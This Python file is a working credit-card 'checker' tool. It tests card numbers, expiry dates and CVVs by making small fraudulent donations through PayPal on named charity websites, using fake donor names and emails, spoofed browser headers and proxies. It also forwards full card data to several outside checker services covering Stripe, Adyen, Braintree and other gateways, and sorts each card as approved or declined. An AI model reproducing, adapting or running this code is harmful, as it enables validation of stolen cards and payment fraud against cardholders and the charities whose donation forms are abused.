import requests
import json
import re
import random
import base64
import time
import urllib3
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# Helper: Format proxy for requests
# ============================================================================
def format_proxy(proxy):
    """Convert proxy string (ip:port or ip:port:user:pass) to dict for requests."""
    if not proxy:
        return None
    parts = proxy.split(':')
    if len(parts) == 2:
        url = f"http://{parts[0]}:{parts[1]}"
        return {'http': url, 'https': url}
    elif len(parts) == 4:
        url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return {'http': url, 'https': url}
    return None

# ============================================================================
# Simple random user‑agent generator (no external dependency)
# ============================================================================
def generate_user_agent():
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    ]
    return random.choice(ua_list)

# ============================================================================
# PayPal Donation Checker – Fixed Site (alhijrahtrust.org)
# ============================================================================
def check_paypal_fixed(cc, proxy=None):
    """
    Checks a card on the hardcoded site alhijrahtrust.org.
    Accepts proxy (string) and uses it.
    Returns (message, status) where status is 'APPROVED' or 'DECLINED' or 'ERROR'.
    """
    try:
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) < 4:
            return "Invalid format", "ERROR"
        cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2:
            yy = '20' + yy

        # --- Fixed site data ---
        SITE_URL = 'https://alhijrahtrust.org/donations/old-phase-2-archive/'
        BASE_URL = 'https://alhijrahtrust.org'
        UA = generate_user_agent()

        # --- Extract initial form data ---
        def extract_data():
            s = requests.Session()
            s.verify = False
            # Apply proxy if given
            if proxy:
                s.proxies.update(format_proxy(proxy))
            headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
            r = s.get(SITE_URL, headers=headers, timeout=30)
            html = r.text

            if 'givewp-route=donation-form-view' in html and 'givewp-route-signature' not in html:
                fid = re.search(r'form-id[=]+(\d+)', html)
                if fid:
                    iframe = f'{BASE_URL}/?givewp-route=donation-form-view&form-id={fid.group(1)}'
                    r2 = s.get(iframe, headers=headers, timeout=30)
                    html = r2.text

            fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
            fi = re.search(r'name="give-form-id" value="(.*?)"', html)
            nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
            if not all([fp, fi, nc]):
                return None

            enc = re.search(r'"data-client-token":"(.*?)"', html)
            if not enc:
                return None
            dec = base64.b64decode(enc.group(1)).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec)
            if not au:
                return None

            return {
                'fp': fp.group(1), 'fi': fi.group(1), 'nc': nc.group(1),
                'at': au.group(1), 'session': s
            }

        d = extract_data()
        if not d:
            return "Failed to extract form data", "ERROR"

        s = d['session']
        fp, fi, nc, at = d['fp'], d['fi'], d['nc'], d['at']

        email = f'drgam{random.randint(100,999)}@gmail.com'
        first_name = 'DRGAM'
        last_name = 'rights and'

        # --- Step 1: Initial donation setup (GET) ---
        headers = {
            'origin': BASE_URL, 'referer': SITE_URL,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': UA, 'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
            'give-form-title': '', 'give-current-url': SITE_URL,
            'give-form-url': SITE_URL, 'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99', 'give-form-hash': nc,
            'give-price-id': '3', 'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1', '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '1.00', 'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce', 'give_first': first_name,
            'give_last': last_name, 'give_email': email,
            'card_name': 'drgam', 'card_exp_month': '', 'card_exp_year': '',
            'give_action': 'purchase', 'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation', 'give_ajax': 'true',
        }
        s.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=30)

        # --- Step 2: Create PayPal order (multipart) ---
        mp = MultipartEncoder(fields={
            'give-honeypot': (None, ''), 'give-form-id-prefix': (None, fp),
            'give-form-id': (None, fi), 'give-form-title': (None, ''),
            'give-current-url': (None, SITE_URL), 'give-form-url': (None, SITE_URL),
            'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nc), 'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, first_name),
            'give_last': (None, last_name), 'give_email': (None, email),
            'card_name': (None, 'drgam'), 'card_exp_month': (None, ''),
            'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
        })
        headers['content-type'] = mp.content_type
        r1 = s.post(f'{BASE_URL}/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order', headers=headers, data=mp, timeout=30)
        try:
            tok = r1.json()['data']['id']
        except:
            return f"Order creation failed: {r1.text[:150]}", "ERROR"

        # --- Step 3: Confirm payment source with PayPal ---
        pp_headers = {
            'authority': 'cors.api.paypal.com', 'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': f'Bearer {at}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site', 'user-agent': UA,
        }
        json_data = {
            'payment_source': {
                'card': {
                    'number': cc_num,
                    'expiry': f'{yy}-{mm}',
                    'security_code': cvv,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
                }
            },
            'application_context': {'vault': False},
        }
        # This request also uses the proxy (the session already has proxy)
        confirm_resp = s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=pp_headers, json=json_data, timeout=30)
        # We don't need to parse this response; proceed to approval

        # --- Step 4: Approve order ---
        mp2 = MultipartEncoder(fields={
            'give-honeypot': (None, ''), 'give-form-id-prefix': (None, fp),
            'give-form-id': (None, fi), 'give-form-title': (None, ''),
            'give-current-url': (None, SITE_URL), 'give-form-url': (None, SITE_URL),
            'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nc), 'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, first_name),
            'give_last': (None, last_name), 'give_email': (None, email),
            'card_name': (None, 'drgam'), 'card_exp_month': (None, ''),
            'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
        })
        headers['content-type'] = mp2.content_type
        r2 = s.post(f'{BASE_URL}/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order=' + tok, headers=headers, data=mp2, timeout=30)
        txt = r2.text

        # --- Parse response ---
        decline_patterns = {
            'DO_NOT_HONOR': 'Do not honor',
            'ACCOUNT_CLOSED': 'Account closed',
            'PAYER_ACCOUNT_LOCKED_OR_CLOSED': 'Account closed',
            'LOST_OR_STOLEN': 'Lost or stolen',
            'CVV2_FAILURE': 'CVV failure',
            'SUSPECTED_FRAUD': 'Suspected fraud',
            'INVALID_ACCOUNT': 'Invalid account',
            'REATTEMPT_NOT_PERMITTED': 'Reattempt not permitted',
            'ACCOUNT_BLOCKED_BY_ISSUER': 'Account blocked by issuer',
            'ORDER_NOT_APPROVED': 'Order not approved',
            'PICKUP_CARD_SPECIAL_CONDITIONS': 'Pickup card special conditions',
            'PAYER_CANNOT_PAY': 'Payer cannot pay',
            'INSUFFICIENT_FUNDS': 'Insufficient funds',
            'GENERIC_DECLINE': 'Generic decline',
            'COMPLIANCE_VIOLATION': 'Compliance violation',
            'TRANSACTION_NOT_PERMITTED': 'Transaction not permitted',
            'PAYMENT_DENIED': 'Payment denied',
            'INVALID_TRANSACTION': 'Invalid transaction',
            'RESTRICTED_OR_INACTIVE_ACCOUNT': 'Restricted or inactive account',
            'SECURITY_VIOLATION': 'Security violation',
            'DECLINED_DUE_TO_UPDATED_ACCOUNT': 'Declined due to updated account',
            'INVALID_OR_RESTRICTED_CARD': 'Invalid or restricted card',
            'EXPIRED_CARD': 'Expired card',
            'CRYPTOGRAPHIC_FAILURE': 'Cryptographic failure',
            'TRANSACTION_CANNOT_BE_COMPLETED': 'Transaction cannot be completed',
            'DECLINED_PLEASE_RETRY': 'Declined, please retry',
            'TX_ATTEMPTS_EXCEED_LIMIT': 'Exceed limit',
        }
        for key, msg in decline_patterns.items():
            if key in txt:
                return f"Declined: {msg}", "DECLINED"
        if 'true' in txt or 'sucsess' in txt or 'COMPLETED' in txt:
            return "Charged $1.00", "APPROVED"
        return f"Unknown response: {txt[:200]}", "ERROR"

    except Exception as e:
        return f"Exception: {str(e)[:100]}", "ERROR"


# ============================================================================
# PayPal Donation Checker – General (any site, any amount) with proxy support
# ============================================================================
class DonationChecker:
    def __init__(self, website_url, donation_amount, proxy=None):
        self.session = requests.Session()
        if proxy:
            self.session.proxies.update(format_proxy(proxy))
        self.user_agent = generate_user_agent()
        self.base_url = website_url.rstrip('/')
        self.donation_page = f'{self.base_url}/donations/'
        self.min_amount = '0.01'
        self.donation_amount = str(donation_amount)

    def generate_random_name(self):
        first_names = ["James", "John", "Robert", "Michael", "William",
                      "David", "Richard", "Joseph", "Thomas", "Charles"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones",
                     "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        return random.choice(first_names), random.choice(last_names)

    def generate_email(self, first_name, last_name):
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
        return f"{first_name.lower()}{last_name.lower()}{random.randint(100,999)}@{random.choice(domains)}"

    def parse_credit_card(self, cc_data):
        parts = cc_data.strip().split("|")
        card_number = parts[0]
        month = parts[1]
        year = parts[2]
        cvv = parts[3].strip()
        if "20" in year:
            year = year.split("20")[1]
        return card_number, month, year, cvv

    def get_page_data(self):
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.user_agent,
        }
        response = self.session.get(self.donation_page, headers=headers)
        form_data = {}
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
        if id_form1:
            form_data['id_form1'] = id_form1.group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text)
        if id_form2:
            form_data['id_form2'] = id_form2.group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
        if nonec:
            form_data['nonec'] = nonec.group(1)
        enc = re.search(r'"data-client-token":"(.*?)"', response.text)
        if enc:
            dec = base64.b64decode(enc.group(1)).decode('utf-8')
            access_token = re.search(r'"accessToken":"(.*?)"', dec)
            if access_token:
                form_data['access_token'] = access_token.group(1)
        return form_data

    def process_initial_donation(self, form_data, first_name, last_name, email):
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.user_agent,
            'x-requested-with': 'XMLHttpRequest',
        }
        data = [
            ('give-honeypot', ''),
            ('give-price-id', 'custom'),
            ('give-form-id-prefix', form_data.get('id_form1', '')),
            ('give-form-id', form_data.get('id_form2', '')),
            ('give-form-title', 'Donate'),
            ('give-current-url', self.donation_page),
            ('give-form-url', self.donation_page),
            ('give-form-minimum', self.min_amount),
            ('give-form-maximum', '999999.99'),
            ('give-form-hash', form_data.get('nonec', '')),
            ('give-amount', self.donation_amount),
            ('give_stripe_payment_method', ''),
            ('payment-mode', 'paypal-commerce'),
            ('give_first', first_name),
            ('give_last', last_name),
            ('give_company_option', 'no'),
            ('give_company_name', ''),
            ('give_email', email),
            ('give_comment', ''),
            ('card_name', f"{first_name},{last_name}"),
            ('card_exp_month', ''),
            ('card_exp_year', ''),
            ('give_agree_to_terms', '1'),
            ('give_action', 'purchase'),
            ('give-gateway', 'paypal-commerce'),
            ('action', 'give_process_donation'),
            ('give_ajax', 'true'),
        ]
        return self.session.post(f'{self.base_url}/wp-admin/admin-ajax.php', headers=headers, data=data)

    def create_paypal_order(self, form_data, first_name, last_name, email):
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.user_agent,
        }
        params = {'action': 'give_paypal_commerce_create_order'}
        multipart_data = MultipartEncoder([
            ('give-honeypot', (None, '')),
            ('give-price-id', (None, 'custom')),
            ('give-form-id-prefix', (None, form_data.get('id_form1', ''))),
            ('give-form-id', (None, form_data.get('id_form2', ''))),
            ('give-form-title', (None, 'Donate')),
            ('give-current-url', (None, self.donation_page)),
            ('give-form-url', (None, self.donation_page)),
            ('give-form-minimum', (None, self.min_amount)),
            ('give-form-maximum', (None, '999999.99')),
            ('give-form-hash', (None, form_data.get('nonec', ''))),
            ('give-amount', (None, self.donation_amount)),
            ('give_stripe_payment_method', (None, '')),
            ('payment-mode', (None, 'paypal-commerce')),
            ('give_first', (None, first_name)),
            ('give_last', (None, last_name)),
            ('give_company_option', (None, 'no')),
            ('give_company_name', (None, '')),
            ('give_email', (None, email)),
            ('give_comment', (None, '')),
            ('card_name', (None, f"{first_name},{last_name}")),
            ('card_exp_month', (None, '')),
            ('card_exp_year', (None, '')),
            ('give_agree_to_terms', (None, '1')),
            ('give-gateway', (None, 'paypal-commerce')),
        ])
        headers['content-type'] = multipart_data.content_type
        response = self.session.post(
            f'{self.base_url}/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            data=multipart_data
        )
        return response.json()['data']['id']

    def confirm_payment_source(self, token, access_token, card_number, month, year, cvv):
        headers = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'authorization': f'Bearer {access_token}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': '739b1263dc2b6bec1e7d9b8ae229ec25',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': self.user_agent,
        }
        json_data = {
            'payment_source': {
                'card': {
                    'number': card_number,
                    'expiry': f'20{year}-{month}',
                    'security_code': cvv,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
                }
            },
            'application_context': {'vault': False}
        }
        response = self.session.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{token}/confirm-payment-source',
            headers=headers,
            json=json_data
        )
        return response

    def approve_order(self, token, form_data, first_name, last_name, email):
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.user_agent,
        }
        params = {'action': 'give_paypal_commerce_approve_order', 'order': token}
        multipart_data = MultipartEncoder([
            ('give-honeypot', (None, '')),
            ('give-price-id', (None, 'custom')),
            ('give-form-id-prefix', (None, form_data.get('id_form1', ''))),
            ('give-form-id', (None, form_data.get('id_form2', ''))),
            ('give-form-title', (None, 'Donate')),
            ('give-current-url', (None, self.donation_page)),
            ('give-form-url', (None, self.donation_page)),
            ('give-form-minimum', (None, self.min_amount)),
            ('give-form-maximum', (None, '999999.99')),
            ('give-form-hash', (None, form_data.get('nonec', ''))),
            ('give-amount', (None, self.donation_amount)),
            ('give_stripe_payment_method', (None, '')),
            ('payment-mode', (None, 'paypal-commerce')),
            ('give_first', (None, first_name)),
            ('give_last', (None, last_name)),
            ('give_company_option', (None, 'no')),
            ('give_company_name', (None, '')),
            ('give_email', (None, email)),
            ('give_comment', (None, '')),
            ('card_name', (None, f"{first_name},{last_name}")),
            ('card_exp_month', (None, '')),
            ('card_exp_year', (None, '')),
            ('give_agree_to_terms', (None, '1')),
            ('give-gateway', (None, 'paypal-commerce')),
        ])
        headers['content-type'] = multipart_data.content_type
        return self.session.post(
            f'{self.base_url}/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            data=multipart_data
        )

    def get_decline_reason(self, text):
        decline_patterns = {
            'true': f'Charged {self.donation_amount}$',
            'COMPLETED': f'Charged {self.donation_amount}$',
            'DO_NOT_HONOR': 'DO_NOT_HONOR',
            'ACCOUNT_CLOSED': 'ACCOUNT_CLOSED',
            'PAYER_ACCOUNT_LOCKED_OR_CLOSED': 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
            'LOST_OR_STOLEN': 'LOST_OR_STOLEN',
            'CVV2_FAILURE': 'CVV2_FAILURE',
            'SUSPECTED_FRAUD': 'SUSPECTED_FRAUD',
            'INVALID_ACCOUNT': 'INVALID_ACCOUNT',
            'REATTEMPT_NOT_PERMITTED': 'REATTEMPT_NOT_PERMITTED',
            'ACCOUNT_BLOCKED_BY_ISSUER': 'ACCOUNT_BLOCKED_BY_ISSUER',
            'ORDER_NOT_APPROVED': 'ORDER_NOT_APPROVED',
            'PICKUP_CARD_SPECIAL_CONDITIONS': 'PICKUP_CARD_SPECIAL_CONDITIONS',
            'PAYER_CANNOT_PAY': 'PAYER_CANNOT_PAY',
            'INSUFFICIENT_FUNDS': 'INSUFFICIENT_FUNDS',
            'GENERIC_DECLINE': 'GENERIC_DECLINE',
            'COMPLIANCE_VIOLATION': 'COMPLIANCE_VIOLATION',
            'TRANSACTION_NOT_PERMITTED': 'TRANSACTION_NOT_PERMITTED',
            'PAYMENT_DENIED': 'PAYMENT_DENIED',
            'INVALID_TRANSACTION': 'INVALID_TRANSACTION',
            'RESTRICTED_OR_INACTIVE_ACCOUNT': 'RESTRICTED_OR_INACTIVE_ACCOUNT',
            'SECURITY_VIOLATION': 'SECURITY_VIOLATION',
            'DECLINED_DUE_TO_UPDATED_ACCOUNT': 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
            'INVALID_OR_RESTRICTED_CARD': 'INVALID_OR_RESTRICTED_CARD',
            'EXPIRED_CARD': 'EXPIRED_CARD',
            'CRYPTOGRAPHIC_FAILURE': 'CRYPTOGRAPHIC_FAILURE',
            'TRANSACTION_CANNOT_BE_COMPLETED': 'TRANSACTION_CANNOT_BE_COMPLETED',
            'DECLINED_PLEASE_RETRY': 'DECLINED_PLEASE_RETRY',
            'TX_ATTEMPTS_EXCEED_LIMIT': 'TX_ATTEMPTS_EXCEED_LIMIT',
        }
        for pattern, message in decline_patterns.items():
            if pattern in text:
                return message
        try:
            data = json.loads(text)
            if 'data' in data and 'error' in data['data']:
                return data['data']['error']
        except:
            pass
        return 'UNKNOWN_ERROR'

    def check_card(self, cc_data):
        try:
            card_number, month, year, cvv = self.parse_credit_card(cc_data)
            first_name, last_name = self.generate_random_name()
            email = self.generate_email(first_name, last_name)
            form_data = self.get_page_data()
            if not form_data:
                return "Failed to extract form data"
            self.process_initial_donation(form_data, first_name, last_name, email)
            token = self.create_paypal_order(form_data, first_name, last_name, email)
            confirm_resp = self.confirm_payment_source(token, form_data['access_token'],
                                                       card_number, month, year, cvv)
            if isinstance(confirm_resp, str):
                return confirm_resp
            response = self.approve_order(token, form_data, first_name, last_name, email)
            result = self.get_decline_reason(response.text)
            if 'true' in response.text:
                try:
                    data = response.json()
                    last_status = data["data"]["order"]["purchase_units"][0]["payments"]["captures"][-1]["status"]
                    if last_status == 'COMPLETED':
                        return f'Charged {self.donation_amount}$'
                except:
                    pass
            return result
        except Exception as e:
            return f"ERROR: {str(e)}"


# Global configuration for general PayPal gate
PAYPAL_SITE = "http://bavashdesigns.com"  # default, should be changed
PAYPAL_AMOUNT = 0.05

def check_paypal_general(cc, proxy=None):
    """
    Checks a card using the DonationChecker with globally configured site and amount.
    Accepts proxy and passes it to the checker.
    """
    try:
        checker = DonationChecker(PAYPAL_SITE, PAYPAL_AMOUNT, proxy=proxy)
        result = checker.check_card(cc)
        if f'Charged {PAYPAL_AMOUNT}$' in result:
            return result, "APPROVED"
        else:
            return result, "DECLINED"
    except Exception as e:
        return f"Exception: {str(e)}", "ERROR"


# ============================================================================
# Stripe API Gate
# ============================================================================
STRIPE_SITE = "newzealandtrends.com"
STRIPE_API_URL = "https://stripe-checker-production-e6a0.up.railway.app/v1/stripe/auth"

def check_stripe_api(cc, proxy=None):
    """
    Check a card using the external Stripe API.
    Returns (message, status) where status is 'APPROVED' or 'DECLINED'.
    """
    try:
        # Clean and parse CC
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) < 4:
            return "Invalid format", "ERROR"
        cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]

        # Build the URL: parameters go after /auth/ (no ?)
        import urllib.parse
        param_string = f"site={STRIPE_SITE}&cc={cc_num}%7C{mm}%7C{yy}%7C{cvv}"
        url = f"{STRIPE_API_URL}/{param_string}"

        # Prepare session with proxy if provided
        session = requests.Session()
        if proxy:
            session.proxies.update(format_proxy(proxy))

        # Make request
        response = session.get(url, timeout=30, verify=False)
        response.raise_for_status()
        data = response.json()

        # Extract result field
        result = data.get('result', '').lower()

        # Determine status
        if 'charged' in result or 'approved' in result or 'success' in result:
            return result, "APPROVED"
        else:
            return result, "DECLINED"

    except requests.exceptions.Timeout:
        return "Timeout", "ERROR"
    except requests.exceptions.RequestException as e:
        return f"Request error: {str(e)}", "ERROR"
    except json.JSONDecodeError:
        return "Invalid API response", "ERROR"
    except Exception as e:
        return f"Exception: {str(e)[:100]}", "ERROR"


# ============================================================================
# Generic Onyx API Gate (all gates share the same base URL and key)
# ============================================================================
ONYX_API_BASE = "https://onyxenvbot.up.railway.app"
API_KEY = "yashikaaa"   # can be changed by owner

def _check_onyx_gate(cc, gateway_path, gateway_name):
    try:
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) < 4:
            return "Invalid format", "ERROR"
        cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]

        import urllib.parse
        cc_encoded = urllib.parse.quote(cc)
        url = f"{ONYX_API_BASE}/{gateway_path}/key={API_KEY}/cc={cc_encoded}"

        session = requests.Session()
        response = session.get(url, timeout=60, verify=False)
        response.raise_for_status()
        data = response.json()

        result_status = data.get('status', '').lower()
        response_msg = data.get('response', '')

        if result_status == 'approved':
            return response_msg, "APPROVED"
        else:
            return response_msg, "DECLINED"

    except requests.exceptions.Timeout:
        return "Timeout", "ERROR"
    except requests.exceptions.RequestException as e:
        return f"Request error: {str(e)}", "ERROR"
    except json.JSONDecodeError:
        return "Invalid API response", "ERROR"
    except Exception as e:
        return f"Exception: {str(e)[:100]}", "ERROR"

# Define each gate using the helper
def check_chaos(cc, proxy=None): return _check_onyx_gate(cc, "chaos", "Chaos Auth")
def check_adyen(cc, proxy=None): return _check_onyx_gate(cc, "adyen", "Adyen Auth")
def check_app_auth(cc, proxy=None): return _check_onyx_gate(cc, "app-auth", "App Based Auth")
def check_payflow(cc, proxy=None): return _check_onyx_gate(cc, "payflow", "Payflow")
def check_random(cc, proxy=None): return _check_onyx_gate(cc, "random", "Random Auth")
def check_shopify_onyx(cc, proxy=None): return _check_onyx_gate(cc, "shopify", "Shopify")
def check_skrill(cc, proxy=None): return _check_onyx_gate(cc, "skrill", "Skrill")
def check_braintree(cc, proxy=None): return _check_onyx_gate(cc, "braintree", "Braintree")
def check_stripe_onyx(cc, proxy=None): return _check_onyx_gate(cc, "stripe", "Stripe")
def check_arcenus(cc, proxy=None): return _check_onyx_gate(cc, "arcenus", "Arcenus")
def check_random_stripe(cc, proxy=None): return _check_onyx_gate(cc, "random-stripe", "Random Stripe")
def check_razorpay(cc, proxy=None): return _check_onyx_gate(cc, "razorpay", "RazorPay")
def check_payu(cc, proxy=None): return _check_onyx_gate(cc, "payu", "PayU")
def check_sk_gateway(cc, proxy=None): return _check_onyx_gate(cc, "sk", "SK Gateway")
def check_paypal_onyx(cc, proxy=None): return _check_onyx_gate(cc, "paypal", "PayPal")
